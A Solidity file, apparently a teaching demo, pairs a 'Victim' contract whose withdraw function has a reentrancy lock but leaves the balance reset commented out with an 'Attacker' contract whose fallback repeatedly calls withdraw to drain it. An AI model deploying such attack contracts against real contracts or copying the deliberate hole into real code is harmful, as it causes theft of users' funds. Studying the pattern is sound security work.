// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


contract Victim {
    mapping(address => uint) public balances;

    constructor() payable {

    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public noReentrant() {
        uint bal = balances[msg.sender];
        require(bal > 0, "Balance is zero!");

        //balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to withdraw ether");

        //balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attacker {
    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    fallback() external payable {
        if (address(victim).balance >= 1)
            victim.withdraw();

    }

    function attack() external payable {
        require(msg.value >= 1, "Not enough ether");
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
